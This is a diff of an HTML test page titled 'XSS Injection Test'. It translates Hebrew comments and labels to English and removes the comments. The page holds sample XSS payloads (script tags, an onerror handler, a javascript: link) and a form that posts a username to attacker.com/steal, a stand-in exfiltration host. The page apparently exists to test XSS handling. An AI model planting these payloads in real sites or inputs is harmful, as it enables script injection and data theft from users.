@@ -4,26 +4,23 @@
   <meta charset="UTF-8">
   <title>XSS Injection Test</title>
   <script>
-    alert('XSS בוצעה דרך <script>');
+    alert('XSS <script>');
     document.body.innerHTML += "<h1 style='color:red'>Injected HTML</h1>";
   </script>
 </head>
 <body>
-  <h1>בדיקת XSS</h1>
+  <h1>test XSS</h1>
 
-  <!-- onerror injection -->
-  <img src="x" onerror="alert('XSS דרך onerror')">
+  <img src="x" onerror="alert('XSS  onerror')">
 
-  <!-- script injection בתוך ערך -->
   <input value="<script>alert('input value XSS')</script>">
 
-  <!-- קישור זדוני -->
-  <a href="javascript:alert('XSS בקישור')">לחץ כאן</a>
+  <a href="javascript:alert('XSS link')">click</a>
 
-  <!-- ניסיון לשליחת טופס לשרת חיצוני -->
+ 
   <form action="http://attacker.com/steal" method="POST">
     <input name="username" value="admin">
-    <input type="submit" value="שלח מידע רגיש">
+    <input type="submit" value="send sensitive data">
   </form>
 </body>
 </html>
